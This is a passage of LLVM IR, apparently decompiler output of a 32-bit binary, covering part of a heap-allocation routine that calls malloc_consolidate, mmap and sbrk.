  store i32 %v0_16bb0, i32* %v3_16bb0, align 4
  %v0_16bb4 = load i32, i32* %r3.global-to-local, align 4
  %v1_16bb4 = load i32, i32* %r1.global-to-local, align 4
  %v2_16bb4 = add i32 %v1_16bb4, 4
  %v3_16bb4 = inttoptr i32 %v2_16bb4 to i32*
  store i32 %v0_16bb4, i32* %v3_16bb4, align 4
  br label %dec_label_pc_16fbc

dec_label_pc_16bbc:                               ; preds = %dec_label_pc_16b70
  %v1_16bbc = inttoptr i32 %v4_16b78 to i32*
  %v2_16bbc = load i32, i32* %v1_16bbc, align 4
  store i32 %v2_16bbc, i32* %r3.global-to-local, align 4
  %v1_16bc0 = and i32 %v2_16bbc, 2
  store i32 %v1_16bc0, i32* %ip.global-to-local, align 4
  %v2_16bc0 = icmp eq i32 %v1_16bc0, 0
  %v1_16bc4 = add i32 %v4_16b78, 860
  %v2_16bc4 = inttoptr i32 %v1_16bc4 to i32*
  %v3_16bc4 = load i32, i32* %v2_16bc4, align 4
  store i32 %v3_16bc4, i32* %r1.global-to-local, align 4
  br i1 %v2_16bc0, label %dec_label_pc_16bdc, label %dec_label_pc_16bcc

dec_label_pc_16bcc:                               ; preds = %dec_label_pc_16bbc
  %v0_16bcc = call i32 @__malloc_consolidate()
  %v0_16bd0 = load i32, i32* @sl, align 4
  %v1_16bd0 = add i32 %v0_16bd0, -7
  store i32 %v1_16bd0, i32* %r0.global-to-local, align 4
  %v1_16bd4 = call i32 @malloc(i32 %v1_16bd0)
  store i32 %v1_16bd4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16fb8

dec_label_pc_16bdc:                               ; preds = %dec_label_pc_16bbc
  %v1_16bdc = add i32 %v4_16b78, 844
  %v2_16bdc = inttoptr i32 %v1_16bdc to i32*
  %v3_16bdc = load i32, i32* %v2_16bdc, align 4
  store i32 %v3_16bdc, i32* %r3.global-to-local, align 4
  %v3_16be0 = icmp ult i32 %v0_16b84, %v3_16bdc
  %v1_16be4 = add i32 %v3_16bc4, -1
  store i32 %v1_16be4, i32* %sb.global-to-local, align 4
  br i1 %v3_16be0, label %dec_label_pc_16cb8, label %dec_label_pc_16bec

dec_label_pc_16bec:                               ; preds = %dec_label_pc_16bdc
  %v1_16bec = add i32 %v4_16b78, 852
  %v2_16bec = inttoptr i32 %v1_16bec to i32*
  %v3_16bec = load i32, i32* %v2_16bec, align 4
  store i32 %v3_16bec, i32* %r2.global-to-local, align 4
  %v1_16bf0 = add i32 %v4_16b78, 848
  %v2_16bf0 = inttoptr i32 %v1_16bf0 to i32*
  %v3_16bf0 = load i32, i32* %v2_16bf0, align 4
  store i32 %v3_16bf0, i32* %r3.global-to-local, align 4
  %v6_16bf8 = icmp slt i32 %v3_16bf0, %v3_16bec
  br i1 %v6_16bf8, label %dec_label_pc_16bfc, label %dec_label_pc_16cb8

dec_label_pc_16bfc:                               ; preds = %dec_label_pc_16bec
  %v1_16bfc = add i32 %v0_16b84, 10
  %v2_16c00 = add i32 %v1_16bfc, %v3_16bc4
  store i32 %v2_16c00, i32* %r3.global-to-local, align 4
  %v2_16c04 = sub i32 0, %v3_16bc4
  %v3_16c04 = and i32 %v2_16c00, %v2_16c04
  store i32 %v3_16c04, i32* @r4, align 4
  %tmp212 = icmp ugt i32 %v3_16c04, %v0_16b84
  br i1 %tmp212, label %dec_label_pc_16c10, label %dec_label_pc_16cb8

dec_label_pc_16c10:                               ; preds = %dec_label_pc_16bfc
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_16c04, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_16c28 = call i32 @mmap(i32 0, i32 %v3_16c04, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_16c28, i32* %r0.global-to-local, align 4
  %v7_16c2c = icmp eq i32 %v6_16c28, -1
  br i1 %v7_16c2c, label %dec_label_pc_16c10.dec_label_pc_16cb8_crit_edge, label %dec_label_pc_16c34

dec_label_pc_16c10.dec_label_pc_16cb8_crit_edge:  ; preds = %dec_label_pc_16c10
  %v1_16cdc.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_16cb8

dec_label_pc_16c34:                               ; preds = %dec_label_pc_16c10
  %v1_16c34 = urem i32 %v6_16c28, 8
  store i32 %v1_16c34, i32* %r2.global-to-local, align 4
  %v2_16c34 = icmp eq i32 %v1_16c34, 0
  br i1 %v2_16c34, label %bb147, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_16c34
  %v2_16c38 = sub nsw i32 8, %v1_16c34
  store i32 %v2_16c38, i32* %r3.global-to-local, align 4
  %v2_16c3c = load i32, i32* @r4, align 4
  %v3_16c3c = sub i32 %v2_16c3c, %v2_16c38
  %v3_16c40 = add i32 %v2_16c38, %v6_16c28
  store i32 %v3_16c40, i32* %lr.global-to-local, align 4
  %v2_16c48 = or i32 %v3_16c3c, 2
  store i32 %v2_16c48, i32* %r2.global-to-local, align 4
  %v5_16c50 = inttoptr i32 %v3_16c40 to i32*
  store i32 %v2_16c38, i32* %v5_16c50, align 4
  %v1_16c54 = load i32, i32* %r2.global-to-local, align 4
  %v2_16c54 = load i32, i32* %lr.global-to-local, align 4
  %v3_16c54 = add i32 %v2_16c54, 4
  %v4_16c54 = inttoptr i32 %v3_16c54 to i32*
  store i32 %v1_16c54, i32* %v4_16c54, align 4
  br label %.thread28

bb147:                                            ; preds = %dec_label_pc_16c34
  store i32 %v6_16c28, i32* %lr.global-to-local, align 4
  %v1_16c4c48 = load i32, i32* @r4, align 4
  %v2_16c4c49 = or i32 %v1_16c4c48, 2
  store i32 %v2_16c4c49, i32* %r3.global-to-local, align 4
  %v3_16c58 = inttoptr i32 %v6_16c28 to i32*
  store i32 0, i32* %v3_16c58, align 4
  %v1_16c5c = load i32, i32* %r3.global-to-local, align 4
  %v2_16c5c = load i32, i32* %lr.global-to-local, align 4
  %v3_16c5c = add i32 %v2_16c5c, 4
  %v4_16c5c = inttoptr i32 %v3_16c5c to i32*
  store i32 %v1_16c5c, i32* %v4_16c5c, align 4
  br label %.thread28

.thread28:                                        ; preds = %.thread26, %bb147
  store i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32* %r2.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_16c68 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 36) to i32*), align 4
  store i32 %v4_16c68, i32* %ip.global-to-local, align 4
  %v1_16c6c = add i32 %v4_16c68, 848
  %v2_16c6c = inttoptr i32 %v1_16c6c to i32*
  %v3_16c6c = load i32, i32* %v2_16c6c, align 4
  store i32 %v3_16c6c, i32* %r3.global-to-local, align 4
  %v1_16c70 = add i32 %v4_16c68, 856
  %v2_16c70 = inttoptr i32 %v1_16c70 to i32*
  %v3_16c70 = load i32, i32* %v2_16c70, align 4
  store i32 %v3_16c70, i32* %r2.global-to-local, align 4
  %v1_16c74 = add i32 %v3_16c6c, 1
  store i32 %v1_16c74, i32* %r3.global-to-local, align 4
  %v7_16c7c = icmp sgt i32 %v1_16c74, %v3_16c70
  br i1 %v7_16c7c, label %bb148, label %bb149

bb148:                                            ; preds = %.thread28
  store i32 %v1_16c74, i32* %v2_16c70, align 4
  %v0_16c80.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_16c80.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb149

bb149:                                            ; preds = %.thread28, %bb148
  %v1_16c80 = phi i32 [ %v4_16c68, %.thread28 ], [ %v1_16c80.pre, %bb148 ]
  %v0_16c80 = phi i32 [ %v1_16c74, %.thread28 ], [ %v0_16c80.pre, %bb148 ]
  %v2_16c80 = add i32 %v1_16c80, 848
  %v3_16c80 = inttoptr i32 %v2_16c80 to i32*
  store i32 %v0_16c80, i32* %v3_16c80, align 4
  %v0_16c84 = load i32, i32* %ip.global-to-local, align 4
  %v1_16c84 = add i32 %v0_16c84, 868
  %v2_16c84 = inttoptr i32 %v1_16c84 to i32*
  %v3_16c84 = load i32, i32* %v2_16c84, align 4
  store i32 %v3_16c84, i32* %r3.global-to-local, align 4
  %v1_16c88 = add i32 %v0_16c84, 880
  %v2_16c88 = inttoptr i32 %v1_16c88 to i32*
  %v3_16c88 = load i32, i32* %v2_16c88, align 4
  store i32 %v3_16c88, i32* %r2.global-to-local, align 4
  %v0_16c8c = load i32, i32* @r4, align 4
  %v2_16c8c = add i32 %v0_16c8c, %v3_16c84
  store i32 %v2_16c8c, i32* %r1.global-to-local, align 4
  %v1_16c90 = add i32 %v0_16c84, 872
  %v2_16c90 = inttoptr i32 %v1_16c90 to i32*
  %v3_16c90 = load i32, i32* %v2_16c90, align 4
  store i32 %v3_16c90, i32* %r3.global-to-local, align 4
  %v1_16c98 = add i32 %v0_16c84, 884
  %v2_16c98 = inttoptr i32 %v1_16c98 to i32*
  %v3_16c98 = load i32, i32* %v2_16c98, align 4
  store i32 %v3_16c98, i32* %r2.global-to-local, align 4
  %tmp213 = icmp ugt i32 %v2_16c8c, %v3_16c88
  br i1 %tmp213, label %bb150, label %bb151

bb150:                                            ; preds = %bb149
  store i32 %v2_16c8c, i32* %v2_16c88, align 4
  %v0_16ca0.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_16ca0.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb151

bb151:                                            ; preds = %bb149, %bb150
  %v1_16ca0 = phi i32 [ %v0_16c84, %bb149 ], [ %v1_16ca0.pre, %bb150 ]
  %v0_16ca0 = phi i32 [ %v2_16c8c, %bb149 ], [ %v0_16ca0.pre, %bb150 ]
  %v2_16ca0 = add i32 %v1_16ca0, 868
  %v3_16ca0 = inttoptr i32 %v2_16ca0 to i32*
  store i32 %v0_16ca0, i32* %v3_16ca0, align 4
  %v0_16ca4 = load i32, i32* %r1.global-to-local, align 4
  %v1_16ca4 = load i32, i32* %r3.global-to-local, align 4
  %v2_16ca4 = add i32 %v1_16ca4, %v0_16ca4
  store i32 %v2_16ca4, i32* %r1.global-to-local, align 4
  %v1_16ca8 = load i32, i32* %r2.global-to-local, align 4
  %v0_16cac = load i32, i32* %lr.global-to-local, align 4
  %v1_16cac = add i32 %v0_16cac, 8
  store i32 %v1_16cac, i32* %r0.global-to-local, align 4
  %tmp214 = icmp ugt i32 %v2_16ca4, %v1_16ca8
  br i1 %tmp214, label %bb152, label %dec_label_pc_16fb8

bb152:                                            ; preds = %bb151
  %v5_16cb0 = load i32, i32* %ip.global-to-local, align 4
  %v6_16cb0 = add i32 %v5_16cb0, 884
  %v7_16cb0 = inttoptr i32 %v6_16cb0 to i32*
  store i32 %v2_16ca4, i32* %v7_16cb0, align 4
  br label %dec_label_pc_16fb8

dec_label_pc_16cb8:                               ; preds = %dec_label_pc_16bfc, %dec_label_pc_16bdc, %dec_label_pc_16c10.dec_label_pc_16cb8_crit_edge, %dec_label_pc_16bec
  %v1_16cdc = phi i32 [ %v1_16cdc.pre, %dec_label_pc_16c10.dec_label_pc_16cb8_crit_edge ], [ %v0_16b84, %dec_label_pc_16bec ], [ %v0_16b84, %dec_label_pc_16bdc ], [ %v0_16b84, %dec_label_pc_16bfc ]
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32* %ip.global-to-local, align 4
  %v4_16cc0 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 36) to i32*), align 4
  store i32 %v4_16cc0, i32* %r3.global-to-local, align 4
  %v1_16cc4 = add i32 %v4_16cc0, 44
  %v2_16cc4 = inttoptr i32 %v1_16cc4 to i32*
  %v3_16cc4 = load i32, i32* %v2_16cc4, align 4
  store i32 %v3_16cc4, i32* %r0.global-to-local, align 4
  %v1_16cc8 = add i32 %v4_16cc0, 864
  %v2_16cc8 = inttoptr i32 %v1_16cc8 to i32*
  %v3_16cc8 = load i32, i32* %v2_16cc8, align 4
  store i32 %v3_16cc8, i32* %r2.global-to-local, align 4
  %v1_16ccc = add i32 %v4_16cc0, 840
  %v2_16ccc = inttoptr i32 %v1_16ccc to i32*
  %v3_16ccc = load i32, i32* %v2_16ccc, align 4
  store i32 %v3_16ccc, i32* %r3.global-to-local, align 4
  %v1_16cd0 = add i32 %v3_16cc4, 4
  %v2_16cd0 = inttoptr i32 %v1_16cd0 to i32*
  %v3_16cd0 = load i32, i32* %v2_16cd0, align 4
  store i32 %v3_16cd0, i32* %r1.global-to-local, align 4
  %v1_16cd8 = urem i32 %v3_16cc8, 2
  %v2_16cd8 = icmp eq i32 %v1_16cd8, 0
  %v1_16cd4 = add i32 %v1_16cdc, 16
  %v2_16cdc = add i32 %v1_16cd4, %v3_16ccc
  store i32 %v2_16cdc, i32* %r3.global-to-local, align 4
  %v1_16ce0 = and i32 %v3_16cd0, -4
  store i32 %v1_16ce0, i32* @r8, align 4
  br i1 %v2_16cd8, label %bb154, label %bb153

bb153:                                            ; preds = %dec_label_pc_16cb8
  %v3_16ce4 = sub i32 %v2_16cdc, %v1_16ce0
  store i32 %v3_16ce4, i32* %r3.global-to-local, align 4
  br label %bb154

bb154:                                            ; preds = %dec_label_pc_16cb8, %bb153
  %v0_16ce8 = phi i32 [ %v2_16cdc, %dec_label_pc_16cb8 ], [ %v3_16ce4, %bb153 ]
  %v1_16ce8 = load i32, i32* %sb.global-to-local, align 4
  %v2_16ce8 = add i32 %v1_16ce8, %v0_16ce8
  store i32 %v2_16ce8, i32* %r3.global-to-local, align 4
  %v1_16cec = sub i32 -1, %v1_16ce8
  store i32 %v1_16cec, i32* %fp.global-to-local, align 4
  %v2_16cf0 = and i32 %v2_16ce8, %v1_16cec
  store i32 %v2_16cf0, i32* @r5, align 4
  %tmp155 = icmp slt i32 %v2_16cf0, 1
  br i1 %tmp155, label %dec_label_pc_16d14, label %dec_label_pc_16d00

dec_label_pc_16d00:                               ; preds = %bb154
  store i32 %v2_16cf0, i32* %r0.global-to-local, align 4
  %v1_16d04 = call i32 @__GI_sbrk(i32 %v2_16cf0)
  store i32 %v1_16d04, i32* %r0.global-to-local, align 4
  %v3_16d08 = icmp eq i32 %v1_16d04, -1
  store i32 %v1_16d04, i32* @r4, align 4
  br i1 %v3_16d08, label %dec_label_pc_16d14, label %dec_label_pc_16d80

dec_label_pc_16d14:                               ; preds = %dec_label_pc_16d00, %bb154
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32* %r1.global-to-local, align 4
  %v4_16d1c = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 36) to i32*), align 4
  store i32 %v4_16d1c, i32* %r6.global-to-local, align 4
  %v1_16d20 = add i32 %v4_16d1c, 864
  %v2_16d20 = inttoptr i32 %v1_16d20 to i32*
  %v3_16d20 = load i32, i32* %v2_16d20, align 4
  store i32 %v3_16d20, i32* %r3.global-to-local, align 4
  %v1_16d24 = urem i32 %v3_16d20, 2
  %v2_16d24 = icmp eq i32 %v1_16d24, 0
  br i1 %v2_16d24, label %.thread30thread-pre-split, label %bb156

bb156:                                            ; preds = %dec_label_pc_16d14
  %v1_16d28 = load i32, i32* @r8, align 4
  %v2_16d28 = load i32, i32* %sb.global-to-local, align 4
  %v3_16d28 = add i32 %v2_16d28, %v1_16d28
  %v2_16d2c = load i32, i32* @r5, align 4
  %v3_16d2c = add i32 %v3_16d28, %v2_16d2c
  store i32 %v3_16d2c, i32* %r3.global-to-local, align 4
  %v2_16d30 = load i32, i32* %fp.global-to-local, align 4
  %v3_16d30 = and i32 %v2_16d30, %v3_16d2c
  store i32 %v3_16d30, i32* @r5, align 4
  br label %.thread30

.thread30thread-pre-split:                        ; preds = %dec_label_pc_16d14
  %v0_16d34.pr = load i32, i32* @r5, align 4
  br label %.thread30

.thread30:                                        ; preds = %.thread30thread-pre-split, %bb156
  %v0_16d34 = phi i32 [ %v0_16d34.pr, %.thread30thread-pre-split ], [ %v3_16d30, %bb156 ]
  %v2_16d34 = icmp ugt i32 %v0_16d34, 1048575
  br i1 %v2_16d34, label %bb158, label %bb157

bb157:                                            ; preds = %.thread30
  store i32 1048576, i32* @r5, align 4
  br label %bb158

bb158:                                            ; preds = %.thread30, %bb157
  %v0_16d4c = phi i32 [ %v0_16d34, %.thread30 ], [ 1048576, %bb157 ]
  %v1_16d3c = load i32, i32* @sl, align 4
  %tmp215 = icmp ugt i32 %v0_16d4c, %v1_16d3c
  br i1 %tmp215, label %dec_label_pc_16d44, label %dec_label_pc_16fa8

dec_label_pc_16d44:                               ; preds = %bb158
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_16d4c, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_16d60 = call i32 @mmap(i32 0, i32 %v0_16d4c, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_16d60, i32* %r0.global-to-local, align 4
  %v3_16d64 = icmp eq i32 %v6_16d60, -1
  %v8_16d64 = icmp eq i32 %v6_16d60, -1
  store i32 %v6_16d60, i32* @r4, align 4
  br i1 %v8_16d64, label %.thread33, label %bb159

bb159:                                            ; preds = %dec_label_pc_16d44
  %v1_16d6c = load i32, i32* %r6.global-to-local, align 4
  %v2_16d6c = add i32 %v1_16d6c, 864
  %v3_16d6c = inttoptr i32 %v2_16d6c to i32*
  %v4_16d6c = load i32, i32* %v3_16d6c, align 4
  %v2_16d70 = load i32, i32* @r5, align 4
  %v3_16d70 = add i32 %v2_16d70, %v6_16d60
  store i32 %v3_16d70, i32* %r0.global-to-local, align 4
  %v2_16d74 = and i32 %v4_16d6c, -2
  store i32 %v2_16d74, i32* %r3.global-to-local, align 4
  store i32 %v2_16d74, i32* %v3_16d6c, align 4
  br label %.thread33

.thread33:                                        ; preds = %dec_label_pc_16d44, %bb159
  br i1 %v3_16d64, label %dec_label_pc_16d80, label %dec_label_pc_16d84

dec_label_pc_16d80:                               ; preds = %.thread33, %dec_label_pc_16d00
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16d84

dec_label_pc_16d84:                               ; preds = %.thread33, %dec_label_pc_16d80
  %v0_16d84 = load i32, i32* @r4, align 4
  %v7_16d84 = icmp eq i32 %v0_16d84, -1
  br i1 %v7_16d84, label %dec_label_pc_16fa8, label %dec_label_pc_16d8c

dec_label_pc_16d8c:                               ; preds = %dec_label_pc_16d84
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32* %r2.global-to-local, align 4
  %v4_16d94 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 36) to i32*), align 4
  store i32 %v4_16d94, i32* %ip.global-to-local, align 4
  store i32 %v3_16cc4, i32* %r2.global-to-local, align 4
  %v1_16d9c = add i32 %v4_16d94, 872
  %v2_16d9c = inttoptr i32 %v1_16d9c to i32*
  %v3_16d9c = load i32, i32* %v2_16d9c, align 4
  %v1_16da0 = load i32, i32* @r8, align 4
  %v2_16da0 = add i32 %v1_16da0, %v3_16cc4
  store i32 %v2_16da0, i32* %r1.global-to-local, align 4
  %v0_16da4 = load i32, i32* @r5, align 4
  %v2_16da4 = add i32 %v0_16da4, %v3_16d9c
  store i32 %v2_16da4, i32* %r3.global-to-local, align 4
  %v9_16da8 = icmp eq i32 %v0_16d84, %v2_16da0
  br i1 %v9_16da8, label %bb160, label %.thread123

.thread123:                                       ; preds = %dec_label_pc_16d8c
  store i32 %v2_16da4, i32* %v2_16d9c, align 4
  br label %dec_label_pc_16dc4

bb160:                                            ; preds = %dec_label_pc_16d8c
  %v1_16dac = load i32, i32* %r0.global-to-local, align 4
  %v8_16dac = icmp eq i32 %v1_16dac, -1
  store i32 %v2_16da4, i32* %v2_16d9c, align 4
  br i1 %v8_16dac, label %.thread35, label %dec_label_pc_16dc4

.thread35:                                        ; preds = %bb160
  %v1_16db4 = load i32, i32* @r5, align 4
  %v2_16db4 = load i32, i32* @r8, align 4
  %v3_16db4 = add i32 %v2_16db4, %v1_16db4
  %v2_16db8 = or i32 %v3_16db4, 1
  store i32 %v2_16db8, i32* %r3.global-to-local, align 4
  %v2_16dbc = load i32, i32* %r2.global-to-local, align 4
  %v3_16dbc = add i32 %v2_16dbc, 4
  %v4_16dbc = inttoptr i32 %v3_16dbc to i32*
  store i32 %v2_16db8, i32* %v4_16dbc, align 4
  br label %dec_label_pc_16f3c

dec_label_pc_16dc4:                               ; preds = %bb160, %.thread123
  %v0_16dc8.pr = load i32, i32* @r8, align 4
  %v0_16dc4 = load i32, i32* %ip.global-to-local, align 4
  %v1_16dc4 = add i32 %v0_16dc4, 864
  %v2_16dc4 = inttoptr i32 %v1_16dc4 to i32*
  %v3_16dc4 = load i32, i32* %v2_16dc4, align 4
  store i32 %v3_16dc4, i32* %r2.global-to-local, align 4
  %v2_16dc8 = icmp eq i32 %v0_16dc8.pr, 0
  br i1 %v2_16dc8, label %.thread38, label %.thread37

.thread38:                                        ; preds = %dec_label_pc_16dc4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread41

.thread37:                                        ; preds = %dec_label_pc_16dc4
  %v2_16dd0 = urem i32 %v3_16dc4, 2
  store i32 %v2_16dd0, i32* %r3.global-to-local, align 4
  %v2_16dd4 = icmp eq i32 %v2_16dd0, 0
  br i1 %v2_16dd4, label %.thread41, label %dec_label_pc_16ddc

dec_label_pc_16ddc:                               ; preds = %.thread37
  %v0_16ddc = load i32, i32* @r4, align 4
  %v1_16ddc = load i32, i32* %r1.global-to-local, align 4
  %v3_16ddc = icmp ult i32 %v0_16ddc, %v1_16ddc
  br i1 %v3_16ddc, label %bb161, label %.thread41

bb161:                                            ; preds = %dec_label_pc_16ddc
  %v2_16de0 = and i32 %v3_16dc4, -2
  store i32 %v2_16de0, i32* %r3.global-to-local, align 4
  store i32 %v2_16de0, i32* %v2_16dc4, align 4
  br label %.thread41

.thread41:                                        ; preds = %dec_label_pc_16ddc, %.thread38, %.thread37, %bb161
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32* %ip.global-to-local, align 4
  %v4_16df0 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 36) to i32*), align 4
  store i32 %v4_16df0, i32* @r7, align 4
  %v1_16df4 = add i32 %v4_16df0, 864
  %v2_16df4 = inttoptr i32 %v1_16df4 to i32*
  %v3_16df4 = load i32, i32* %v2_16df4, align 4
  store i32 %v3_16df4, i32* %r3.global-to-local, align 4
  %v1_16df8 = urem i32 %v3_16df4, 2
  store i32 %v1_16df8, i32* @r6, align 4
  %v2_16df8 = icmp eq i32 %v1_16df8, 0
  br i1 %v2_16df8, label %dec_label_pc_16e8c, label %dec_label_pc_16e00

dec_label_pc_16e00:                               ; preds = %.thread41
  %v0_16e00 = load i32, i32* @r8, align 4
  %v2_16e00 = icmp eq i32 %v0_16e00, 0
  br i1 %v2_16e00, label %.thread44, label %bb162

bb162:                                            ; preds = %dec_label_pc_16e00
  %v2_16e04 = add i32 %v4_16df0, 872
  %v3_16e04 = inttoptr i32 %v2_16e04 to i32*
  %v4_16e04 = load i32, i32* %v3_16e04, align 4
  store i32 %v4_16e04, i32* %r2.global-to-local, align 4
  %v1_16e08 = load i32, i32* %r1.global-to-local, align 4
  %v2_16e08 = load i32, i32* @r4, align 4
  %v3_16e08 = sub i32 %v2_16e08, %v1_16e08
  %v3_16e0c = add i32 %v3_16e08, %v4_16e04
  store i32 %v3_16e0c, i32* %r3.global-to-local, align 4
  store i32 %v3_16e0c, i32* %v3_16e04, align 4
  br label %.thread44

.thread44:                                        ; preds = %dec_label_pc_16e00, %bb162
  %v0_16e14 = load i32, i32* @r4, align 4
  %v1_16e14 = urem i32 %v0_16e14, 8
  store i32 %v1_16e14, i32* %r3.global-to-local, align 4
  %v2_16e14 = icmp eq i32 %v1_16e14, 0
  br i1 %v2_16e14, label %.thread45, label %bb163

bb163:                                            ; preds = %.thread44
  %v2_16e18 = sub nsw i32 8, %v1_16e14
  store i32 %v2_16e18, i32* %r3.global-to-local, align 4
  %v3_16e1c = add i32 %v2_16e18, %v0_16e14
  store i32 %v3_16e1c, i32* @r7, align 4
  br label %.thread45

.thread45:                                        ; preds = %.thread44, %bb163
  %v0_16e24 = phi i32 [ 0, %.thread44 ], [ %v2_16e18, %bb163 ]
  %v1_16e20 = load i32, i32* @r5, align 4
  %v2_16e20 = add i32 %v1_16e20, %v0_16e14
  store i32 %v2_16e20, i32* @r6, align 4
  %v1_16e24 = load i32, i32* @r8, align 4
  %v2_16e24 = add i32 %v2_16e20, %v0_16e24
  %v2_16e28 = add i32 %v2_16e24, %v1_16e24
  store i32 %v2_16e28, i32* %r1.global-to-local, align 4
  %v1_16e2c = load i32, i32* %sb.global-to-local, align 4
  %v2_16e2c = add i32 %v1_16e2c, %v2_16e28
  %v1_16e30 = load i32, i32* %fp.global-to-local, align 4
  %v2_16e30 = and i32 %v1_16e30, %v2_16e2c
  store i32 %v2_16e30, i32* %r2.global-to-local, align 4
  %v2_16e34 = sub i32 0, %v2_16e20
  store i32 %v2_16e34, i32* %r3.global-to-local, align 4
  %v2_16e38 = sub i32 %v2_16e30, %v2_16e20
  store i32 %v2_16e38, i32* @r5, align 4
  store i32 %v2_16e38, i32* %r0.global-to-local, align 4
  br i1 %v2_16e14, label %bb164, label %bb165

bb164:                                            ; preds = %.thread45
  store i32 %v0_16e14, i32* @r7, align 4
  br label %bb165

bb165:                                            ; preds = %.thread45, %bb164
  %v1_16e44 = call i32 @__GI_sbrk(i32 %v2_16e38)
  store i32 %v1_16e44, i32* %r0.global-to-local, align 4
  %v3_16e48 = icmp eq i32 %v1_16e44, -1
  br i1 %v3_16e48, label %dec_label_pc_16e50, label %dec_label_pc_16e60

dec_label_pc_16e50:                               ; preds = %bb165
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_16e54 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_16e54, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_16eb8

dec_label_pc_16e60:                               ; preds = %bb165
  %v1_16e60 = load i32, i32* @r4, align 4
  %v3_16e60 = icmp ult i32 %v1_16e44, %v1_16e60
  br i1 %v3_16e60, label %dec_label_pc_16e68, label %dec_label_pc_16eb8

dec_label_pc_16e68:                               ; preds = %dec_label_pc_16e60
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32* %r0.global-to-local, align 4
  %v4_16e70 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 36) to i32*), align 4
  store i32 %v4_16e70, i32* %r2.global-to-local, align 4
  %v1_16e74 = add i32 %v4_16e70, 864
  %v2_16e74 = inttoptr i32 %v1_16e74 to i32*
  %v3_16e74 = load i32, i32* %v2_16e74, align 4
  %v0_16e78 = load i32, i32* @r6, align 4
  store i32 %v0_16e78, i32* %r0.global-to-local, align 4
  %v1_16e7c = and i32 %v3_16e74, -2
  store i32 %v1_16e7c, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_16e7c, i32* %v2_16e74, align 4
  br label %dec_label_pc_16eb8

dec_label_pc_16e8c:                               ; preds = %.thread41
  %v0_16e8c = load i32, i32* %r0.global-to-local, align 4
  %v3_16e8c = icmp eq i32 %v0_16e8c, -1
  br i1 %v3_16e8c, label %dec_label_pc_16e94, label %dec_label_pc_16eb0

dec_label_pc_16e94:                               ; preds = %dec_label_pc_16e8c
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_16e98 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_16e98, i32* %r0.global-to-local, align 4
  %v0_16e9c = load i32, i32* @r7, align 4
  %v1_16e9c = add i32 %v0_16e9c, 872
  %v2_16e9c = inttoptr i32 %v1_16e9c to i32*
  %v3_16e9c = load i32, i32* %v2_16e9c, align 4
  store i32 %v3_16e9c, i32* %r2.global-to-local, align 4
  %v0_16ea0 = load i32, i32* @r4, align 4
  %v0_16ea4 = load i32, i32* @r5, align 4
  %v2_16ea0 = add i32 %v3_16e9c, %v1_16e98
  %v2_16ea4 = sub i32 %v2_16ea0, %v0_16ea0
  %v2_16ea8 = sub i32 %v2_16ea4, %v0_16ea4
  store i32 %v2_16ea8, i32* %r3.global-to-local, align 4
  store i32 %v2_16ea8, i32* %v2_16e9c, align 4
  %v0_16eb4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16eb0

dec_label_pc_16eb0:                               ; preds = %dec_label_pc_16e8c, %dec_label_pc_16e94
  %v0_16eb4 = phi i32 [ 0, %dec_label_pc_16e8c ], [ %v0_16eb4.pre, %dec_label_pc_16e94 ]
  %v0_16eb0 = load i32, i32* @r4, align 4
  store i32 %v0_16eb0, i32* @r7, align 4
  store i32 %v0_16eb4, i32* @r5, align 4
  br label %dec_label_pc_16eb8

dec_label_pc_16eb8:                               ; preds = %dec_label_pc_16e60, %dec_label_pc_16e68, %dec_label_pc_16e50, %dec_label_pc_16eb0
  %v0_16eb8 = load i32, i32* %r0.global-to-local, align 4
  %v7_16eb8 = icmp eq i32 %v0_16eb8, -1
  br i1 %v7_16eb8, label %dec_label_pc_16f3c, label %dec_label_pc_16ec0

